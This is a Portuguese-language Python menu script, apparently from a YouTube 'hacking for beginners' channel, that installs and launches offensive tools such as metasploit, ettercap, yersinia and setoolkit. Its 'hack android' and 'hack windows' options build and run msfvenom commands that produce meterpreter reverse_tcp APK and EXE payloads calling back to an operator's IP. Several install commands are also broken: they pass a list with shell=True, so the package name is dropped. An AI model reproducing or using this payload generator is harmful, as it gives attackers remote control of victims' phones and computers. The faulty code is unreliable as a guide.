#!/usr/bin/python

import subprocess
import time

print('Abrindo Ferramenta...')
t = time.sleep(5)
print('''
created: Mr.HACv4
channel youtube: hacking linux
#-------------##---------------#
|    SCRIPT PARA INICIANTES    |
#-------------##---------------#
''')
c = str(input('''
root@anonymous:~# '''))
if c == 'help':
    c2 = int(input('''
OPCOES
---------------------------------
(1)  update
(2)  upgrade
(3)  instalar o python
(4)  instalar o git
(5)  instalar o perl
(6)  instalar o python3
(7)  instalar o whatweb
(8)  instalar o nmap
(9)  instalar o nikto
(10) instalar o ettercap
(11) instalar o yersinia
(12) hack android
(13) hack windows
(14) iniciar o metasploit
(15) iniciar yersinia grafico
(16) iniciar nmap grafico
(17) iniciar ettercap grafico
(18) setoolkit iniciar
----------------------------------
root@anonymous:~# ''')) 
    if c2 == 1:
        print('-'*25)
        print('PREPARANDO UPDATE...')
        print('-'*25)
        t1 = time.sleep(5)
        processo = subprocess.call(["apt-get", "update"])
    elif c2 == 2:
        print('-'*25)
        print('PREPARANDO UPGRADE...')
        print('-'*25)
        t2 = time.sleep(5)
        processo1 = subprocess.call(["apt-get", "upgrade"])
    elif c2 == 3:
        print('-'*29)
        print('PREPARANDO PARA INSTALAR O PYTHON... ')
        print('-'*29)
        t3 = time.sleep(5)
        processo3 = subprocess.call(["apt-get install", "python"], shell=True)
    elif c2 == 4:
        print('-'*30)
        print('PREPARANDO PARA INSTALAR O GIT... ')
        print('-'*30)
        t4 = time.sleep(5)
        processo4 = subprocess.call(["apt-get install", "git"], shell=True)
    elif c2 == 5:
        print('-'*25)
        print('PREPARANDO PARA INSTALAR O PERL... ')
        print('-'*25)
        t5 = time.sleep(5)
        processo5 = subprocess.call(["apt-get install", "perl"], shell=True)
    elif c2 == 6:
        print('-'*25)
        print('PREPARANDO PARA INSTALAR O PYTHON3...')
        print('-'*25)
        t6 = time.sleep(5)
        processo6 = subprocess.call(["apt-get install", "python3"], shell=True)
    elif c2 == 7:
        print('-'*20)
        print('PREPARANDO PARA INSTALAR O WHATWEB...')
        print('-'*20)
        t7 = time.sleep(5)
        processo7 = subprocess.call(["apt-get install", "whatweb"], shell=True)
    elif c2 == 8:
        print('-'*25)
        print('PREPARANDO PARA INSTALAR O NMAP...')
        print('-'*25)
        t8 = time.sleep(5)
        processo8 = subprocess.call(["apt-get install", "nmap"], shell=True)
    elif c2 == 9:
        print('-'*25)
        print('PREPARANDO PARA INSTALAR O NIKTO ...')
        print('-'*25)
        t9 = time.sleep(5)
        processo9 = subprocess.call(["apt-get install", "nikto"], shell=True)
    elif c2 == 10:
        print('-'*25)
        print('PREPARANDO PARA INSTALAR O ETTERCAP...')
        print('-'*25)
        t10 = time.sleep(5)
        processo10 = subprocess.call(["apt-get install", "ettercap-text-only"], shell=True)
    elif c2 == 11:
        print('-'*25)
        print('PREPARANDO PARA INSTALAR O YERSINIA...')
        print('-'*25)
        t11 = time.sleep(5)
        processo11 = subprocess.call(["apt-get install", "yersinia"], shell=True)
    elif c2 == 12:
        print('--'*20)
        print('HACK ANDROID')
        print('--'*20)
        ip = str(input('Diga seu ip interno: '))
        porta = int(input('Diga a porta (443 ou 4444): '))
        nome = str(input('Nome do apk(ex: teste.apk): '))
        local = str(input('Diga o local ex de formato /root/Desktop/: '))
        print('---'*15)
        co = ('msfvenom -p android/meterpreter/reverse_tcp LHOST={} LPORT={} R > {}{}'.format(ip, porta, local, nome))
        print('gerando payload...')
        t100 = time.sleep(2)
        print('---'*15)
        processo0 = subprocess.call([co],shell=True)
    elif c2 == 13:
        print('--'*20)
        print('HACK WINDOWS')
        print('--'*20)
        ip1 = str(input('Diga seu ip interno: '))
        porta2 = int(input('Diga a porta(ex: 443 ou 4444): '))
        local2 = str(input('Diga o local ex /root/Desktop/: '))
        nome3 = str(input('Nome do programa ex: teste.exe: '))
        print('---'*17)
        co1 = ('msfvenom -p windows/meterpreter/reverse_tcp LHOST={} LPORT={} R > {}{}'.format(ip1, porta2, local2, nome3))
        print('gerando payload...')
        t4000 = time.sleep(2)
        print('---'*17)
        processo1000 = subprocess.call([co1],shell=True)
    elif c2 == 14:
        print('-'*20)
        print('INICIANDO METASPLOIT... ')
        print('-'*20)
        subprocess.call('msfconsole')
    elif c2 == 15:
        print('-'*20)
        print('INICIANDO YERSINIA...')
        print('-'*20)
        t15 = time.sleep(5)
        processo15 = subprocess.call(["yersinia -G"], shell=True)
    elif c2 == 16:
        print('--'*29)
        print('INICIANDO MODO GRAFICO DO NMAP...')
        print('--'*29)
        t16 = time.sleep(5)
        processo16 = subprocess.call('zenmap')
    elif c2 == 17:
        print('--'*30)
        print('INICIANDO MODO GRAFICO DO ETTERCAP...')
        print('--'*30)
        t17 = time.sleep(5)
        processo17 = subprocess.call(["ettercap -G"], shell=True)
    elif c2 == 18:
        print('-'*25)
        print('Iniciando o Setoolkit...')
        print('-'*25)
        t18 = time.sleep(3)
        processo18 = subprocess.call(["setoolkit"], shell=True)
    elif c2 >= 19:
        print('-'*25)
        print('Erro escolha uma das 18 opcoes')
        print('-'*25)
elif c == 'credits':
        print('''
-------------------------------
CREATED BY: Mr.HACv4
-------------------------------

--------------------------------
CHANNEL YOUTUBE: HACKING LINUX
FERRAMENTA PARA INICIANTES
CRIADA EM PYTHON3 
--------------------------------

-------------------------------
DUVIDAS VA NO CANAL DO YOUTUBE
E COMENTE EM UM DOS MEU VIDEOS.
-------------------------------

---------------------------------------------------------
https://www.youtube.com/channel/UCnRK-2g4uYqAFK-mKtWyYSg
---------------------------------------------------------''') 

